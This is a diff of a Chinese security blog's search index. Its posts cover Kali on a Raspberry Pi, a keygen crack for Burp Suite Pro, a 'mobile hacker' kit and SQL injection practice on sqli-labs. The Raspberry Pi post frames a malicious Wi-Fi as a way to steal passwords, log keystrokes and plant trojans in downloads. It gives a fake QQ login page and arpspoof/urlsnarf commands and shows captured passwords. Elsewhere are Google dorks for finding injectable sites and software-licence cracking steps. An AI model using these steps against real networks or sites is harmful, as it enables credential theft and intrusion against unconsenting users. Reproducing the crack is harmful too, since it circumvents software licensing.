alt="在这里插入图片描述"><br>点击连接然后输入<strong>账号默认是root密码是toor</strong><br>看一下已经连接上去了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416130645277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个我就用他默认的源</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
-<p>运行命令进行更新</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get  update</span><br><span class="line">apt-get  upgrade</span><br></pre></td></tr></table></figure>
-<p>安装远程</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt  install xrdp</span><br></pre></td></tr></table></figure>
-
-<p>启动</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start xrdp</span><br></pre></td></tr></table></figure>
-<p>设置开机自启动</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable  xrdp</span><br></pre></td></tr></table></figure>
-
-<p>连接<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416132549991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>设置中文</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure>
-
-<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416132632601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>解决乱码问题</strong><br>乱码是应为缺少字体<br>安装字体</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install xfonts-intl-chinese</span><br><span class="line">apt-get install ttf-wqy-microhei</span><br></pre></td></tr></table></figure>
-
-
-
-
-<h2 id="我QQ2737977997"><a href="#我QQ2737977997" class="headerlink" title="我QQ2737977997"></a>我QQ2737977997</h2>]]></content>
+      
+      
+        <tags>
+            
+            <tag> 树莓派kali linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>kali2020教程Burpsuite破解汉化版安装</title>
+      <link href="/2020/08/27/kali2020%E6%95%99%E7%A8%8BBurpsuite%E7%A0%B4%E8%A7%A3%E6%B1%89%E5%8C%96%E7%89%88%E5%AE%89%E8%A3%85/"/>
+      <url>/2020/08/27/kali2020%E6%95%99%E7%A8%8BBurpsuite%E7%A0%B4%E8%A7%A3%E6%B1%89%E5%8C%96%E7%89%88%E5%AE%89%E8%A3%85/</url>
+      
+        <content type="html"><![CDATA[<p>BurpSuite<br>废话不多说正题</p><ol><li><p>下载<br>下面是我提供的下载版本和工具<br>[Burp Suite2.0.1.1版]<a href="https://pan.baidu.com/s/1EyD0kYTE2K5EH46sYB6e3A">https://pan.baidu.com/s/1EyD0kYTE2K5EH46sYB6e3A</a>提取码：t3hp<br>[汉化包]<a href="https://pan.baidu.com/s/1wAHXJwADA7cw3pf_zIKDJQ">https://pan.baidu.com/s/1wAHXJwADA7cw3pf_zIKDJQ</a>提取码：b8u0<br>[java ]<a href="https://pan.baidu.com/s/1Yo2PlNTAcr-s678cpkiFHw">https://pan.baidu.com/s/1Yo2PlNTAcr-s678cpkiFHw</a>提取码：6346</p><ol start="2"><li>进行配置<br>叫下载好的保存到一个目录里<br>然后解压出来叫下载好的jdk-8u161-linux-x64.tar.gz<br>命令</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf jdk<span class="number">-8u</span>161-linux-x64.tar.gz</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104131200946.PNG" alt="在这里插入图片描述"><br>解压好进行配置运行下面的代码<br>1</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> JAVA_HOME=/root/桌面/jdk1<span class="number">.8</span>/</span><br></pre></td></tr></table></figure><p>2</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> JRE_HOME=JAVAHOME/jreexportCLASSPATH=.:&#123;JAVA_HOME&#125;/lib:JREHOME/libexportPATH=&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure><p>3</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/java java /root/桌面/jdk1<span class="number">.8</span>/bin/java <span class="number">1</span></span><br></pre></td></tr></table></figure><p>4</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/javac javac /root/桌面/jdk1<span class="number">.8</span>/bin/javac <span class="number">1</span></span><br></pre></td></tr></table></figure><p>5</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --<span class="built_in">set</span> java /root/桌面/jdk1<span class="number">.8</span>/bin/java</span><br></pre></td></tr></table></figure><p>6</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --<span class="built_in">set</span> java /root/桌面/jdk1<span class="number">.8</span>/bin/java</span><br></pre></td></tr></table></figure><p> 7</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --<span class="built_in">set</span> javac /root/桌面/jdk1<span class="number">.8</span>/bin/javac</span><br></pre></td></tr></table></figure><p>然后运行</p></li></ol><pre><code><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure>查看配置成功</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104132555181.png" alt="在这里插入图片描述"><br>3. 开始破解<br>1.先创建一个a.sh文件<br>文件里面a.sh内容</p><pre><code><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar burp-loader-keygen.ja</span><br></pre></td></tr></table></figure>![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104140446983.png)加执行权限<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x a.sh</span><br></pre></td></tr></table></figure>![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104140551606.png)然后运行<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./a,sh</span><br></pre></td></tr></table></figure>运行后会出现![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104140607834.png)</code></pre><p>2.创建一个burp.sh文件<br>文件里面a.sh内容</p><pre><code><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Dfile.encoding=utf<span class="number">-8</span> -javaagent:BurpSuiteCn.jar -Xbootclasspath/p:burp-loader-keygen.jar  -Xmx1024m -jar  burpsuite_pro_v2<span class="number">.0</span><span class="number">.11b</span>eta.jar</span><br></pre></td></tr></table></figure>![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104140820842.png)</code></pre><p>加执行权限</p><pre><code><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x burp.sh</span><br></pre></td></tr></table></figure>运行<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./burp.sh</span><br></pre></td></tr></table></figure>可以看到是中文的了![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104141137443.png)</code></pre><ol start="3"><li>安装<br> 下面叫内容复制到里面<pre><code>                 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104141229717.png)</code></pre><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104141306592.png" alt="在这里插入图片描述"><br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019110414131589.png" alt="在这里插入图片描述"><br>成功<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104141336122.png" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104141342661.png" alt="在这里插入图片描述"></li></ol><h1 id="作者QQ2737977997"><a href="#作者QQ2737977997" class="headerlink" title="作者QQ2737977997"></a>作者QQ2737977997</h1>]]></content>
+      
+      
       <categories>
-        <category>树莓派kali linux</category>
+          
+          <category> Burpsuite破解 </category>
+          
       </categories>
-      <tags>
-        <tag>树莓派kali linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>用树莓派做移动黑客</title>
-    <url>/2020/08/27/2.%20%E6%A0%91%E8%8E%93%E6%B4%BE%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<h2 id="我玩树莓派的经历"><a href="#我玩树莓派的经历" class="headerlink" title="我玩树莓派的经历"></a>我玩树莓派的经历</h2><p><strong>自学习网络安全也有好几年了</strong></p>
-<p><strong>应为我也是才上职高二年级的一个普通的学生，买树莓派也是考虑了很长时间，毕竟是学生党几百块已经算很贵的了，考虑了很长时间就决定买了一个树莓派，</strong></p>
-<p><strong>树莓派安装kali在下面的连接查看</strong><br><a href="https://blog.csdn.net/qq_41860876/article/details/105409811"><strong>1. 树莓派安装kali linux和说明</strong></a></p>
-<h2 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h2><p>设备有一个树莓派4b4g，<br>支持监听和AP的网卡用来，进行AP发送和连接<br>U盘用来存数据<br>充电宝用来供电<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409143416347.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416150348284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416173032688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416173057535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="搭建恶意wifi"><a href="#搭建恶意wifi" class="headerlink" title="搭建恶意wifi"></a>搭建恶意wifi</h2><ol>
-<li>可以通过恶意wifi从而获得wifi密码<ol>
-<li>获取到密码后，可以进行内网渗透，进行破坏就容易的多了</li>
-</ol>
-</li>
-<li>通过恶意wifi盗窃用户密码<ol>
-<li>可以抓包获取用户和密码，通过dns欺骗访问指定自己的恶意网页实现键盘记录盗窃密码，等等等等 </li>
-</ol>
-</li>
-<li>通过恶意wif往下载程序里面注入病毒木马</li>
-<li>通过恶意wif可以获取个人隐私</li>
-</ol>
-<p><strong>还有很多就不多说了，</strong></p>
-<p>搭建恶意wifi有很多方法<br>有很多种现成的工具，<br>也可以进行手动搭建<br>这个我就用现成的工具了，手动搭建这个文章可能写的很长很长<br>Wifiphisher工具<br><a href="https://github.com/wifiphisher/wifiphisher"><strong>github地址</strong></a></p>
-<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416153656244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416165223437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>做了一个qq登录的页面</strong><br>应为时间浪费太长我就修改了一下里面的内容,内容有不好</p>
-<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416160055172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>中间人攻击也有很多种<br>通过欺骗对方叫流量转发给我然后我在转发出去<br><strong>查看网络里的人</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416174024830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>启动路由转发</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 1 &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arpspoof   -t 目标ip  -r  网关地址</span><br></pre></td></tr></table></figure>
-<p><strong>可以加上-i指定网卡</strong></p>
-<p>进行arp欺骗<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416174659711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>urlsnarf -i wlan0抓取目标访问的网站<br>还有很多<br>成功获取到密码<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416182046801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2>]]></content>
+      
+      
+        <tags>
+            
+            <tag> Burpsuite破解 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>1. 网易web安全渗透  手动sql注入</title>
+      <link href="/2020/08/27/1.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%20%20%E6%89%8B%E5%8A%A8sql%E6%B3%A8%E5%85%A5/"/>
+      <url>/2020/08/27/1.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%20%20%E6%89%8B%E5%8A%A8sql%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><ol><li><p>靶场环境搭建</p><p> 环境环境搭建服务器软件是phpstudy下载地址<a href="https://www.xp.cn/">https://www.xp.cn/</a><br> 靶场是sqli-labs下载地址是<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br> 配置sqli-labs的sql密码<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719151133673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p> 用php5和mysql5.7<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020071915101782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p> 成功<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719153932929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在1这里插入图片描述"></p></li></ol><ol start="2"><li><p>注入的常用的函数</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select system_user();      系统用户名 </span><br><span class="line">select  user(); 　　当前数据库用户名</span><br><span class="line">select  current_user(); 　　当前用户名</span><br></pre></td></tr></table></figure></li></ol><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select  database();  返回当前使用的数据库</span><br></pre></td></tr></table></figure>![在这里插入图片描述](https://img-blog.csdnimg.cn/20200623084124884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">selectversion() mysql; 　　数据库版本</span><br><span class="line">select @@datadir;     数据库路径</span><br><span class="line">select @@basedir;  数据库安装路径</span><br><span class="line">select @@global.version_compile_os;  操作系统的信息</span><br></pre></td></tr></table></figure></code></pre><ol start="3"><li>寻找注入点<br> 无特定目标 </li></ol><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:php?id&#x3D;</span><br></pre></td></tr></table></figure>![在这里插入图片描述](https://img-blog.csdnimg.cn/20200623090208938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)有特定目标<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:php?id&#x3D;site:xxxx.com</span><br></pre></td></tr></table></figure>![在这里插入图片描述](https://img-blog.csdnimg.cn/20200623090405991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)</code></pre><h2 id="检查注入点"><a href="#检查注入点" class="headerlink" title="检查注入点"></a>检查注入点</h2><ol><li><p>手工简单识别</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=1/ and 1=2</span><br><span class="line">and&quot;1=1/and&quot;1=2</span><br><span class="line">and 1 like 1/and 1 like 2</span><br></pre></td></tr></table></figure></li><li><p>工具识别</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -m   要指定的文件     多个目标URL保持到文件里-m就会用文件里的</span><br><span class="line">sqlmap --craw    sqlmap对目标网站进行爬取然后依次进行测试</span><br></pre></td></tr></table></figure></li></ol><h2 id="mysql手动注入"><a href="#mysql手动注入" class="headerlink" title="mysql手动注入"></a>mysql手动注入</h2><ol><li>mysql结构<br> mysql内库<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719142556272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>核心原理:<br>MySq内置的 Information schema库,它功能强大,是我们进行MySq注入的基石!<br>通过 information schema我们可以窥透整个 MySQL的运行情况,也可以查看到数据库中所有的数据信息。</li></ol><ol start="3"><li><p>查询数据库核心语法</p><table><thead><tr><th align="center">功能名称</th><th align="right">查询语句</th></tr></thead><tbody><tr><td align="center">查库</td><td align="right">select schema_name from information_schema.schemata</td></tr><tr><td align="center">查表</td><td align="right">select table_name from information_schema.tables where table_schema=’库名’</td></tr><tr><td align="center">查列</td><td align="right">select column_name from information_schema.columns where table_name=’列名’;</td></tr><tr><td align="center">查数据</td><td align="right">select 列名 from 库名.表名</td></tr></tbody></table><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>   <strong>1.查库</strong><br>   <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719150848459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ol><p><strong>2.查表</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719154201445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>3.查列</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719154345793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以不输入单引号<br>比如<code>&#39;users&#39;</code>列名转换成哈希<code>7573657273</code><br>步骤<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719155359180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719155412516.png" alt="在这里插入图片描述"><br>然后在语句里面输入<code>0x和上面生成出来的哈希</code><br>意思<br>0x是告诉我是16进行的<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719155656713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="4"><li>提示</li></ol><pre><code> **提示1**: 所有类型的sql注入，都是基于査库、表、列语句     **提示2**:sql注入，都是基于査库、表、列语句  査询的场緊：可利用limit限定返回的数置及位置，依次査询</code></pre><p>回显数据的场聚：<em>concat</em>链接多个数据成为一条返回结果<br>咧<br>    1. limit函数<br>上面的这个limit，下面是他的演示，就是叫修改就可以查看其他的行<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020071917081938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>    2. group_concat()函数<br>    他可以叫多个列组合到一个里面，应为sql注入，可能输出的有限制，<br>    找个函数就是，叫内容都输出的一个里面<br>    咧</p><pre><code>    ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719174303407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)**提示3:**.在一些场景，想要快速获取数据，需要接住工具，如：burp</code></pre><h2 id="靶场是sqli-labs进行手动sql注入1-4到这个地方：Sqli-labs-Less1-4关卡"><a href="#靶场是sqli-labs进行手动sql注入1-4到这个地方：Sqli-labs-Less1-4关卡" class="headerlink" title="靶场是sqli-labs进行手动sql注入1-4到这个地方：Sqli-labs Less1-4关卡"></a>靶场是sqli-labs进行手动sql注入1-4到这个地方：<a href="https://blog.csdn.net/qq_41860876/article/details/107405426">Sqli-labs Less1-4关卡</a></h2>]]></content>
+      
+      
       <categories>
-        <category>树莓派kali linux</category>
+          
+          <category> sql注入 </category>
+          
       </categories>
-      <tags>
-        <tag>用树莓派做移动黑客</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2. 网易web安全渗透  union联合查询注入</title>
-    <url>/2020/08/27/2.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%20%20union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="1-sql-union操作符"><a href="#1-sql-union操作符" class="headerlink" title="1. sql union操作符"></a>1. sql union操作符</h2><p>union操作符是用于，并合两个或者多个select语句的结果<br><strong>注意,union内部的 select语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时,每条 select语句中的列的顺序必须相同</strong><br>默认情况,union操作符选取不同的值。如果允许重复的值,请使用 union ALL.。</p>
-<h2 id="2-注入应用场景"><a href="#2-注入应用场景" class="headerlink" title="2. 注入应用场景"></a>2. 注入应用场景</h2><ol>
-<li>只有最后一个 SELECT子句允许有 ORDER BY;</li>
-<li>只有最后一个 SELECT子句允许有uMT;</li>
-<li>只要UNON连接的几个查询的字段数一样且列的数据类型转换没有问题,就可以查询出结果</li>
-<li>注入点页面有回显;</li>
-</ol>
-<h2 id="sql注入流程图-，下面就按照上面的流程进行注入"><a href="#sql注入流程图-，下面就按照上面的流程进行注入" class="headerlink" title="sql注入流程图 ，下面就按照上面的流程进行注入"></a>sql注入流程图 ，下面就按照上面的流程进行注入</h2><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730171110963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h3 id="1-ORDER-BY-判断列数"><a href="#1-ORDER-BY-判断列数" class="headerlink" title="1.ORDER BY 判断列数"></a>1.ORDER BY 判断列数</h3><p>ORDER BY 是用来排序的<br>        进行排序这个ORDER BY 关键字经常用于sql注入的时候，根据错误，判断有几个表<br>        列下面有6个表<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200523185903455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>        <strong>判断有几个表</strong><br>        ORDER BY 7就报错了，应为他只有6个表<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200523190036955.png" alt="在这里插入图片描述"><br>        ORDER BY 6就对了<br>        <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200523190259569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70"><br><strong>用sqli-labs进行测试</strong><br>输入4发现就报错了,那这样就判断出来，字段是有3个<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200730173055957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
